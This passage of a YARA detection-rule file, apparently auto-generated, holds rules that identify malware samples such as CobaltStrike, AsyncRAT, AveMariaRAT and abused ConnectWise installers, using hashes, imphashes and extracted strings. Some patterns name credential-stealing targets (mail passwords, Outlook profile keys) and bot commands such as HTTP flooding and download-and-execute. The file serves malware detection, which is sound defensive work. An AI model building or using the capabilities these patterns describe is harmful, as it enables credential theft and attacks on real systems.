      hash4 = "7610fe95df2a433e8d52377e8301642dacb2e66b19d695f568a6b745d68fd3c5"
      hash5 = "979bd8203f5ad91bb5cd844c51045a244004d6c43c88e11af7bb56cf312dfa6f"
   strings:
      $x1 = " runqueue= stopwait= runqsize= gfreecnt= throwing= spinning=atomicand8float64nanfloat32nanException  ptrSize=  targetpc= until p" ascii /* score: '58.00'*/
      $x2 = "pacer: assist ratio=workbuf is not emptybad use of bucket.mpbad use of bucket.bpruntime: double waitpreempt off reason: forcegc:" ascii /* score: '56.00'*/
      $x3 = "runtime: waitforsingleobject unexpected; result=CreateWaitableTimerEx when creating timer failedruntime.preemptM: duplicatehandl" ascii /* score: '53.00'*/
      $x4 = "runtime.newosprocinternal/runtime/thread exhaustionlocked m0 woke upentersyscallblock spinningthreads=taggedPointerPackunknown c" ascii /* score: '50.00'*/
      $x5 = "23841857910156250123456789ABCDEFGODEBUG: value \"allowmultiplevcsDuplicateTokenExCreateNamedPipeWGetCurrentThreadGetModuleHandle" ascii /* score: '46.00'*/
      $x6 = ", locked to thread, synctest bubble runtime.semacreateruntime.semawakeupreflect.Value.Uintvalue out of range298023223876953125x5" ascii /* score: '45.00'*/
      $x7 = "lock: lock countbad system huge page sizearena already initialized to unused region of span bytes failed with errno=runtime: Vir" ascii /* score: '44.00'*/
      $x8 = "runtime: casgstatus: oldval=gcstopm: negative nmspinningfindrunnable: netpoll with psave on system g not allowednewproc1: newg m" ascii /* score: '43.00'*/
      $x9 = "/cpu/classes/total:cpu-seconds/gc/cycles/automatic:gc-cycles/sched/pauses/total/gc:seconds/sync/mutex/wait/total:seconds/godebug" ascii /* score: '42.50'*/
      $x10 = "unlock: lock countprogToPointerMask: overflow/gc/cycles/forced:gc-cycles/memory/classes/other:bytes/memory/classes/total:bytesfa" ascii /* score: '41.00'*/
      $x11 = "/memory/classes/metadata/mspan/free:bytesruntime.SetFinalizer: second argument is gcSweep being done but phase is not GCoffobjec" ascii /* score: '40.00'*/
      $x12 = "/memory/classes/heap/objects:bytesruntime.SetFinalizer: cannot pass too many pages allocated in chunk?mspan.ensureSwept: m is no" ascii /* score: '39.00'*/
      $x13 = "mheap.freeSpanLocked - invalid free of user arena chunkcasfrom_Gscanstatus:top gp->status is not in scan state is currently not " ascii /* score: '39.00'*/
      $x14 = "sched={pc:, gp->status= pluginpath= : unknown pc  called from runtime: pid=3814697265625invalid base crypto/subtlegocacheverifyi" ascii /* score: '38.00'*/
      $x15 = "malformed GOMEMLIMIT; see `go doc runtime/debug.SetMemoryLimit`runtime.AddCleanup: ptr is equal to arg, cleanup will never runru" ascii /* score: '37.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 12000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 1 of ($x*) )
      ) or ( all of them )
}

rule _d42595b695fc008ef2c56aabd8efd68e_imphash__d42595b695fc008ef2c56aabd8efd68e_imphash__1fc8d079_d42595b695fc008ef2c56aabd8efd6_31 {
   meta:
      description = "_subset_batch - from files d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_1fc8d079.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_41b402ff.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_7610fe95.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_979bd820.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_c95056c2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1d5227118354b0c6d70089730cf121de3ba51e0d9c9c478189559b9e93a890ac"
      hash2 = "1fc8d0798605394a2a0dbc39c80bf5221483668c22faf6782e5254cbbd90a1d3"
      hash3 = "41b402ff6d432fcff5fb710bfb271bdf8d7838eaad5d7f35aac354036b40f18b"
      hash4 = "7610fe95df2a433e8d52377e8301642dacb2e66b19d695f568a6b745d68fd3c5"
      hash5 = "979bd8203f5ad91bb5cd844c51045a244004d6c43c88e11af7bb56cf312dfa6f"
      hash6 = "c95056c2dabb09cdb82d775737ebc1d6b4feab38256357ff66e3a122334e0cfc"
   strings:
      $s1 = "runtime.processorVersionInfo" fullword ascii /* score: '21.00'*/
      $s2 = "runtime.mutexprofilerate" fullword ascii /* score: '21.00'*/
      $s3 = "runtime.stackPoisonCopy" fullword ascii /* score: '20.00'*/
      $s4 = "runtime.execLock" fullword ascii /* score: '19.00'*/
      $s5 = "runtime.getlasterror.abi0" fullword ascii /* score: '18.00'*/
      $s6 = "runtime.printBacklogIndex" fullword ascii /* score: '18.00'*/
      $s7 = "runtime.hashkey" fullword ascii /* score: '16.00'*/
      $s8 = "runtime.buildVersion.str" fullword ascii /* score: '16.00'*/
      $s9 = "os.useGetTempPath2" fullword ascii /* score: '16.00'*/
      $s10 = "errors.ErrUnsupported" fullword ascii /* score: '16.00'*/
      $s11 = "runtime.printBacklog" fullword ascii /* score: '15.00'*/
      $s12 = "runtime.faketime" fullword ascii /* score: '15.00'*/
      $s13 = "runtime.sweep" fullword ascii /* score: '15.00'*/
      $s14 = "runtime.powrprofdll" fullword ascii /* score: '15.00'*/
      $s15 = "runtime.levelLogPages" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 13000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e_b93db323_d42595b695fc008ef2c56aabd8efd68e_imphash__72d757a_32 {
   meta:
      description = "_subset_batch - from files b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e_b93db323.elf, d42595b695fc008ef2c56aabd8efd68e(imphash)_72d757ad.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_c95056c2.exe, dd56a47d6b039b230286c0327d6693062fc843602ac0e3613214735503f798ed_dd56a47d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e"
      hash2 = "72d757ad3719b02a93bb17b3600d349d98fcc283ef168300ba8660ca1f5601d0"
      hash3 = "c95056c2dabb09cdb82d775737ebc1d6b4feab38256357ff66e3a122334e0cfc"
      hash4 = "dd56a47d6b039b230286c0327d6693062fc843602ac0e3613214735503f798ed"
   strings:
      $s1 = "os.(*ProcessState).sys" fullword ascii /* score: '30.00'*/
      $s2 = "os.(*ProcessState).Sys" fullword ascii /* score: '30.00'*/
      $s3 = "os/exec.Command" fullword ascii /* score: '24.00'*/
      $s4 = "os/exec.Command.func1" fullword ascii /* score: '24.00'*/
      $s5 = "*exec.Cmd" fullword ascii /* score: '20.00'*/
      $s6 = "*func(*exec.Cmd)" fullword ascii /* score: '20.00'*/
      $s7 = "os/exec.(*Cmd).writerDescriptor.func1" fullword ascii /* score: '20.00'*/
      $s8 = "os/exec.(*Cmd).writerDescriptor" fullword ascii /* score: '20.00'*/
      $s9 = "os/exec.(*Cmd).Run" fullword ascii /* score: '20.00'*/
      $s10 = "math.Log" fullword ascii /* score: '19.00'*/
      $s11 = "*func(*os.Process) error" fullword ascii /* score: '18.00'*/
      $s12 = "os/exec.closeDescriptors" fullword ascii /* score: '18.00'*/
      $s13 = "os/exec.(*Cmd).childStdin.func1" fullword ascii /* score: '17.00'*/
      $s14 = "os/exec.(*Cmd).environ" fullword ascii /* score: '17.00'*/
      $s15 = "os/exec.(*Cmd).Wait" fullword ascii /* score: '17.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 24000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _dae02f32a21e03ce65412f6e56942daa_imphash__612ed5ba_dae02f32a21e03ce65412f6e56942daa_imphash__bb723217_33 {
   meta:
      description = "_subset_batch - from files dae02f32a21e03ce65412f6e56942daa(imphash)_612ed5ba.dll, dae02f32a21e03ce65412f6e56942daa(imphash)_bb723217.dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "612ed5ba60f450bd094dcf6a19dc3e41b94e056deb2bd7857a3fb3b15a0e7bce"
      hash2 = "bb723217f9c2932116c9e1313d558a7baddb921886eaa3beca95f7b3c5b848b0"
   strings:
      $s1 = "ProcessLoaderDetour" fullword ascii /* score: '24.00'*/
      $s2 = "ProcessManageWritesToExecutableMemory" fullword ascii /* score: '24.00'*/
      $s3 = "ProcessCommandLineInformation" fullword ascii /* score: '23.00'*/
      $s4 = "SystemProcessorPerformanceInformation" fullword ascii /* score: '22.00'*/
      $s5 = "ProcessSubsystemProcess" fullword ascii /* score: '22.00'*/
      $s6 = "ProcessCaptureTrustletLiveDump" fullword ascii /* score: '21.00'*/
      $s7 = "ClassLibrary4.dll" fullword wide /* score: '19.00'*/
      $s8 = "ProcessDebugAuthInformation" fullword ascii /* score: '18.00'*/
      $s9 = "FileMapExecute" fullword ascii /* score: '18.00'*/
      $s10 = "RTL_USER_PROCESS_PARAMETERS32" fullword ascii /* score: '18.00'*/
      $s11 = "RTL_USER_PROCESS_PARAMETERS64" fullword ascii /* score: '18.00'*/
      $s12 = "ProcessCommitReleaseInformation" fullword ascii /* score: '18.00'*/
      $s13 = "PageExecuteRead" fullword ascii /* score: '18.00'*/
      $s14 = "PageExecuteReadWrite" fullword ascii /* score: '18.00'*/
      $s15 = "ProcessInPrivate" fullword ascii /* score: '18.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and pe.imphash() == "dae02f32a21e03ce65412f6e56942daa" and ( 8 of them )
      ) or ( all of them )
}

rule _b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e_b93db323_CobaltStrike_signature__d42595b695fc008ef2c56aabd_34 {
   meta:
      description = "_subset_batch - from files b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e_b93db323.elf, CobaltStrike(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_1fc8d079.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_41b402ff.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_4970e957.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_634ff4b4.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_72d757ad.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_7610fe95.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_7ed53caf.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_979bd820.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_9d83c505.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_c95056c2.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_f8818a24.exe, dd56a47d6b039b230286c0327d6693062fc843602ac0e3613214735503f798ed_dd56a47d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e"
      hash2 = "1bfa20d4e9e1348710eaaed406bd5e65302945ab0ce43ee0943884697781a0b1"
      hash3 = "1d5227118354b0c6d70089730cf121de3ba51e0d9c9c478189559b9e93a890ac"
      hash4 = "1fc8d0798605394a2a0dbc39c80bf5221483668c22faf6782e5254cbbd90a1d3"
      hash5 = "41b402ff6d432fcff5fb710bfb271bdf8d7838eaad5d7f35aac354036b40f18b"
      hash6 = "4970e95727c983c9fc09673db8e3a852c135fdcb74c60ce8b927808eb767f115"
      hash7 = "634ff4b4130189a88f970b2ee8c14109f52b20b51cef431bd4c65e9023a704c1"
      hash8 = "72d757ad3719b02a93bb17b3600d349d98fcc283ef168300ba8660ca1f5601d0"
      hash9 = "7610fe95df2a433e8d52377e8301642dacb2e66b19d695f568a6b745d68fd3c5"
      hash10 = "7ed53cafeb7ec84dbcd378cb16d732466ba9d3ed83a97c4b4a4dbd7ab7efe345"
      hash11 = "979bd8203f5ad91bb5cd844c51045a244004d6c43c88e11af7bb56cf312dfa6f"
      hash12 = "9d83c5056348b6a80c16232a49050485d3917ba93f1310921a9e7e4666142cf7"
      hash13 = "c95056c2dabb09cdb82d775737ebc1d6b4feab38256357ff66e3a122334e0cfc"
      hash14 = "f8818a247bfdfd7017a4c57867dc9f4f0ff9a59c792ad2c5652551a695b1a9a6"
      hash15 = "dd56a47d6b039b230286c0327d6693062fc843602ac0e3613214735503f798ed"
   strings:
      $s1 = "runtime.waitReason.isMutexWait" fullword ascii /* score: '21.00'*/
      $s2 = "runtime.metricReader.compute" fullword ascii /* score: '17.00'*/
      $s3 = "runtime.compute0" fullword ascii /* score: '17.00'*/
      $s4 = "runtime.metricReader.compute-fm" fullword ascii /* score: '17.00'*/
      $s5 = "runtime.pidlegetSpinning" fullword ascii /* score: '15.00'*/
      $s6 = "runtime.gfget.func2" fullword ascii /* score: '15.00'*/
      $s7 = "runtime.(*stkframe).getStackMap" fullword ascii /* score: '15.00'*/
      $s8 = "isMutexWait" fullword ascii /* score: '15.00'*/
      $s9 = "runtime.getExtraM" fullword ascii /* score: '15.00'*/
      $s10 = "runtime.(*goroutineProfileStateHolder).CompareAndSwap" fullword ascii /* score: '14.00'*/
      $s11 = "runtime.sysAllocOS" fullword ascii /* score: '14.00'*/
      $s12 = "runtime.sysReserveOS" fullword ascii /* score: '14.00'*/
      $s13 = "runtime.sysFreeOS" fullword ascii /* score: '14.00'*/
      $s14 = "runtime.sysUnusedOS" fullword ascii /* score: '14.00'*/
      $s15 = "runtime.sysHugePage" fullword ascii /* score: '14.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 24000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _b2860589afa7f137b926525dfb2d9045_imphash__b2860589afa7f137b926525dfb2d9045_imphash__e31c1d66_35 {
   meta:
      description = "_subset_batch - from files b2860589afa7f137b926525dfb2d9045(imphash).exe, b2860589afa7f137b926525dfb2d9045(imphash)_e31c1d66.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d94a92389d47df92cba4fbd19bfe22468745151a817092540e700ab3b08a3547"
      hash2 = "e31c1d66840b1989f65e4b0810394c1d899606dcff927cf591c3847ec37a83f6"
   strings:
      $x1 = "C:\\Users\\4674\\Documents\\GitHub\\NOTOCAR\\svchost\\svchost\\Release\\svchost.pdb" fullword ascii /* score: '34.00'*/
      $x2 = "C:\\Users\\4674\\Documents\\GitHub\\NOTOCAR\\Autorunvb6\\STC\\UpdaterCore\\Release\\UpdaterCore.pdb" fullword ascii /* score: '32.00'*/
      $s3 = "Download & Execute functionality is disabled in this build." fullword ascii /* score: '22.00'*/
      $s4 = "sexplorer.exe" fullword wide /* score: '22.00'*/
      $s5 = "!httpbypass" fullword ascii /* score: '18.00'*/
      $s6 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s7 = "Empty command" fullword ascii /* score: '12.00'*/
      $s8 = "GET / HTTP/1.1" fullword ascii /* score: '12.00'*/
      $s9 = "!httppost" fullword ascii /* score: '12.00'*/
      $s10 = "Unknown command or invalid parameters." fullword ascii /* score: '12.00'*/
      $s11 = "!httpflood" fullword ascii /* score: '12.00'*/
      $s12 = ".?AV?$_Func_impl_no_alloc@V<lambda_12>@?FC@??processInstruction@@YAXV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std" ascii /* score: '11.00'*/
      $s13 = ".?AV?$_Func_impl_no_alloc@V<lambda_11>@?EO@??processInstruction@@YAXV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std" ascii /* score: '11.00'*/
      $s14 = ".?AV?$_Func_impl_no_alloc@V<lambda_6>@?DK@??processInstruction@@YAXV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@" ascii /* score: '11.00'*/
      $s15 = ".?AV<lambda_2>@?CN@??processInstruction@@YAXV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@00@Z@" fullword ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "b2860589afa7f137b926525dfb2d9045" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _ConnectWise_signature__ConnectWise_signature__02f9c24b_ConnectWise_signature__3736f158_ConnectWise_signature__9771ee6344923_36 {
   meta:
      description = "_subset_batch - from files ConnectWise(signature).msi, ConnectWise(signature)_02f9c24b.msi, ConnectWise(signature)_3736f158.msi, ConnectWise(signature)_9771ee6344923fa220489ab01239bdfd(imphash).exe, ConnectWise(signature)_9771ee6344923fa220489ab01239bdfd(imphash)_9c150d19.exe, ConnectWise(signature)_9771ee6344923fa220489ab01239bdfd(imphash)_d7231f53.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3395bb897abb4315adc2f4de84f8586e488de531433c82b3208b84e65a161617"
      hash2 = "02f9c24b8b65fb02f6040e867822f7a013daa6ac1ed2664ac8a21f7a8511d31d"
      hash3 = "3736f158f14a152920163270add0c7b202650ea3524ab584e3ce91088e1bccb0"
      hash4 = "f756bec198768208848f3cf30d4439c47bdfe58f0fbd27cd6570295edbeaed64"
      hash5 = "9c150d1942236b0550489577f9373f97294f5431b256e2c5d2f706589b47873d"
      hash6 = "d7231f539456fe65fbc9633f08e098e62558b33763787f07fe6d3bac054cfcf6"
   strings:
      $x1 = "ERS]\"SchedServiceConfigExecServiceConfigRollbackServiceConfigProgramFilesFolderTBDTARGETDIR.SourceDirFulldbbvsztr.dll|ScreenCon" ascii /* score: '39.00'*/
      $s2 = "TerminateProcessesProcessExecutablePathsToTerminate=[INSTALLLOCATION]ScreenConnect.WindowsBackstageShell.exe,[INSTALLLOCATION]Sc" ascii /* score: '29.00'*/
      $s3 = "CTURE <> \"x86\" AND VersionNT >= 601ScreenConnect.WindowsCredentialProvider.dllFixupServiceArgumentsTerminateProcesses_Initiali" ascii /* score: '27.00'*/
      $s4 = " AND %PROCESSOR_ARCHITECTURE <> \"x86\" AND VersionNT >= 601ScreenConnect.WindowsAuthenticationPackage.dllCredentialProviderFile" ascii /* score: '26.00'*/
      $s5 = "Microsoft.Deployment.Compression.dll" fullword ascii /* score: '26.00'*/
      $s6 = "CommandRunToolSilentElevated" fullword wide /* score: '24.00'*/
      $s7 = "Microsoft.Deployment.WindowsInstaller.Package.dll" fullword ascii /* score: '23.00'*/
      $s8 = "Microsoft.Deployment.Compression.Cab.dll" fullword ascii /* score: '22.00'*/
      $s9 = "ScreenConnect.WindowsAuthenticationPackage.dll" fullword ascii /* score: '22.00'*/
      $s10 = "6Run Tool with Elevation Prompt in Current User Session" fullword ascii /* score: '22.00'*/
      $s11 = "ScreenConnect.WindowsFileManager.exe" fullword ascii /* score: '22.00'*/
      $s12 = "SendClipboardKeystrokesLargeClipboardDataWarningDialogDescription" fullword wide /* score: '18.00'*/
      $s13 = "ScreenConnect.WindowsFileManager.exe.config" fullword ascii /* score: '17.00'*/
      $s14 = "595C1B10-5F3C-42F7-B006-5D9C44DEC4FF}NOT EXCLUDE_CREDENTIAL_PROVIDER AND SERVICE_CLIENT_LAUNCH_PARAMETERS AND %PROCESSOR_ARCHITE" ascii /* score: '15.00'*/
      $s15 = "pYour clipboard contains {0} characters and processing it might require some time. How would you like to proceed?" fullword ascii /* score: '15.00'*/
   condition:
      ( ( uint16(0) == 0xcfd0 or uint16(0) == 0x5a4d ) and filesize < 29000KB and pe.imphash() == "9771ee6344923fa220489ab01239bdfd" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e_b93db323_CobaltStrike_signature__9cbefe68f395e67356e2a5d8d_37 {
   meta:
      description = "_subset_batch - from files b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e_b93db323.elf, CobaltStrike(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, CobaltStrike(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_1fc8d079.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_41b402ff.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_72d757ad.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_7610fe95.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_979bd820.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_c95056c2.exe, dd56a47d6b039b230286c0327d6693062fc843602ac0e3613214735503f798ed_dd56a47d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e"
      hash2 = "4390de792c33fb358e49444f5c40349d2f0929ccf1820b98bc4c29cd08ef475c"
      hash3 = "1bfa20d4e9e1348710eaaed406bd5e65302945ab0ce43ee0943884697781a0b1"
      hash4 = "1d5227118354b0c6d70089730cf121de3ba51e0d9c9c478189559b9e93a890ac"
      hash5 = "1fc8d0798605394a2a0dbc39c80bf5221483668c22faf6782e5254cbbd90a1d3"
      hash6 = "41b402ff6d432fcff5fb710bfb271bdf8d7838eaad5d7f35aac354036b40f18b"
      hash7 = "72d757ad3719b02a93bb17b3600d349d98fcc283ef168300ba8660ca1f5601d0"
      hash8 = "7610fe95df2a433e8d52377e8301642dacb2e66b19d695f568a6b745d68fd3c5"
      hash9 = "979bd8203f5ad91bb5cd844c51045a244004d6c43c88e11af7bb56cf312dfa6f"
      hash10 = "c95056c2dabb09cdb82d775737ebc1d6b4feab38256357ff66e3a122334e0cfc"
      hash11 = "dd56a47d6b039b230286c0327d6693062fc843602ac0e3613214735503f798ed"
   strings:
      $s1 = "internal/poll.(*fdMutex).decref" fullword ascii /* score: '15.00'*/
      $s2 = "internal/poll.(*fdMutex).increfAndClose" fullword ascii /* score: '15.00'*/
      $s3 = "*poll.fdMutex" fullword ascii /* score: '15.00'*/
      $s4 = "reflect.Value.Complex" fullword ascii /* score: '14.00'*/
      $s5 = "strconv.computeBounds" fullword ascii /* score: '14.00'*/
      $s6 = "errors.New" fullword ascii /* score: '13.00'*/
      $s7 = "sync.(*Pool).Get" fullword ascii /* score: '12.00'*/
      $s8 = "strconv.mulByLog10Log2" fullword ascii /* score: '12.00'*/
      $s9 = "fmt.getField" fullword ascii /* score: '12.00'*/
      $s10 = "strconv.mulByLog2Log10" fullword ascii /* score: '12.00'*/
      $s11 = "erroring" fullword ascii /* score: '11.00'*/
      $s12 = "internal/fmtsort.compare" fullword ascii /* score: '11.00'*/
      $s13 = "runtime.netpollopen" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.convTslice" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.stopTheWorld" fullword ascii /* score: '10.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 24000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AveMariaRAT_signature__346c9b88ded843c92a3b0721fedbbd3d_imphash__b069d88b33e75313d6c2f825eb1f4188_imphash__E_piro_signature_38 {
   meta:
      description = "_subset_batch - from files AveMariaRAT(signature)_346c9b88ded843c92a3b0721fedbbd3d(imphash).exe, b069d88b33e75313d6c2f825eb1f4188(imphash).exe, E-piro(signature)_c9596ccdffde444fa435c5f9042f7548(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5066c7ce14b8a3cc419d9a3211b1e13e22b6376f8cec8c91f23767830de6a869"
      hash2 = "f33b9f92f7844ac3e037328500c492c231ad480658f63f5a3f306d4899b1509d"
      hash3 = "bcd6cf9ae14f189191f56ddd643585681fd65271ff7f0c6a4ba9000a316d3001"
   strings:
      $s1 = "System.ComponentModel.Design.IDesignerHost.IsSupported" fullword ascii /* score: '25.00'*/
      $s2 = "Description: The process was terminated due to an internal error in the .NET Runtime" fullword wide /* score: '24.00'*/
      $s3 = "System.ComponentModel.TypeDescriptor.IsComObjectDescriptorSupported" fullword ascii /* score: '23.00'*/
      $s4 = "System.ComponentModel.DefaultValueAttribute.IsSupported" fullword ascii /* score: '20.00'*/
      $s5 = "icu.dll" fullword wide /* score: '20.00'*/
      $s6 = "Description: The process was terminated due to an unhandled exception" fullword wide /* score: '18.00'*/
      $s7 = "RtlGetReturnAddressHijackTarget" fullword ascii /* score: '17.00'*/
      $s8 = "TargetDetails4ExceptionTypeNameFormatter\"TypeNameFormatter6RuntimeGenericParameterDesc" fullword ascii /* score: '17.00'*/
      $s9 = "System.GC.DTargetTCP" fullword ascii /* score: '17.00'*/
      $s10 = "PTryGetArrayTypeForElementType_LookupOnly<TryGetPointerTypeForTargetTypeRTryGetPointerTypeForTargetType_LookupOnly8TryGetByRefTy" ascii /* score: '17.00'*/
      $s11 = "Description: The application requested process termination through System.Environment.FailFast" fullword wide /* score: '17.00'*/
      $s12 = "peForTargetTypeNTryGetByRefTypeForTargetType_LookupOnly(GetCanonicalHashCode@" fullword ascii /* score: '16.00'*/
      $s13 = "PTryGetArrayTypeForElementType_LookupOnly<TryGetPointerTypeForTargetTypeRTryGetPointerTypeForTargetType_LookupOnly8TryGetByRefTy" ascii /* score: '16.00'*/
      $s14 = "(ExecutionEnvironment" fullword ascii /* score: '16.00'*/
      $s15 = "DExecutionEnvironmentImplementation[" fullword ascii /* score: '16.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__16a1317a_AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_39 {
   meta:
      description = "_subset_batch - from files AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_16a1317a.exe, AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ff37506f.exe, dae02f32a21e03ce65412f6e56942daa(imphash)_612ed5ba.dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "16a1317ad2b3a3464c1c97066ce8329a96b226607760393c29eb145e8c7c666c"
      hash2 = "ff37506f2c1d82d61f2eadefe66a685d1142d29b7790d90b76c5969a282cc752"
      hash3 = "612ed5ba60f450bd094dcf6a19dc3e41b94e056deb2bd7857a3fb3b15a0e7bce"
   strings:
      $s1 = "SMTP Password" fullword wide /* PEStudio Blacklist: strings */ /* score: '22.00'*/
      $s2 = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A667" wide /* score: '20.00'*/
      $s3 = "HTTPMail Password" fullword wide /* PEStudio Blacklist: strings */ /* score: '20.00'*/
      $s4 = "Are you mixing protobuf-net and protobuf-csharp-port? See https://stackoverflow.com/q/11564914/23354; type: " fullword wide /* score: '20.00'*/
      $s5 = "SMTP User" fullword wide /* PEStudio Blacklist: strings */ /* score: '17.00'*/
      $s6 = "POP3 Password" fullword wide /* PEStudio Blacklist: strings */ /* score: '17.00'*/
      $s7 = "IMAP Password" fullword wide /* PEStudio Blacklist: strings */ /* score: '17.00'*/
      $s8 = "NNTP Password" fullword wide /* PEStudio Blacklist: strings */ /* score: '17.00'*/
      $s9 = "; please see https://stackoverflow.com/q/14436606/23354" fullword wide /* score: '17.00'*/
      $s10 = " SELECT * FROM win32_operatingsystem" fullword wide /* score: '16.00'*/
      $s11 = "Invalid wire-type; this usually means you have over-written a file without truncating or setting the length; see https://stackov" wide /* score: '16.00'*/
      $s12 = "HTTP User" fullword wide /* PEStudio Blacklist: strings */ /* score: '15.00'*/
      $s13 = "Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676" fullword wide /* score: '12.00'*/
      $s14 = "HTTP Server URL" fullword wide /* PEStudio Blacklist: strings */ /* score: '12.00'*/
      $s15 = "IMAP User" fullword wide /* PEStudio Blacklist: strings */ /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and ( 8 of them )
      ) or ( all of them )
}

rule _b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e_b93db323_d42595b695fc008ef2c56aabd8efd68e_imphash__c95056c_40 {
   meta:
      description = "_subset_batch - from files b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e_b93db323.elf, d42595b695fc008ef2c56aabd8efd68e(imphash)_c95056c2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b93db3237adc9f9fb50c409480767c6d21f842474905c6df39f84698f5b2169e"
      hash2 = "c95056c2dabb09cdb82d775737ebc1d6b4feab38256357ff66e3a122334e0cfc"
   strings:
      $s1 = "doExecute" fullword ascii /* score: '18.00'*/
      $s2 = "regexp.(*Regexp).doExecute" fullword ascii /* score: '18.00'*/
      $s3 = "regexp.compileOnePass" fullword ascii /* score: '17.00'*/
      $s4 = "log.(*Logger).output.deferwrap1" fullword ascii /* score: '14.00'*/
      $s5 = "regexp/syntax.dumpInst" fullword ascii /* score: '14.00'*/
      $s6 = "log.(*Logger).SetOutput.deferwrap1" fullword ascii /* score: '14.00'*/
      $s7 = "regexp.compile" fullword ascii /* score: '14.00'*/
      $s8 = "log.(*Logger).output.deferwrap2" fullword ascii /* score: '14.00'*/
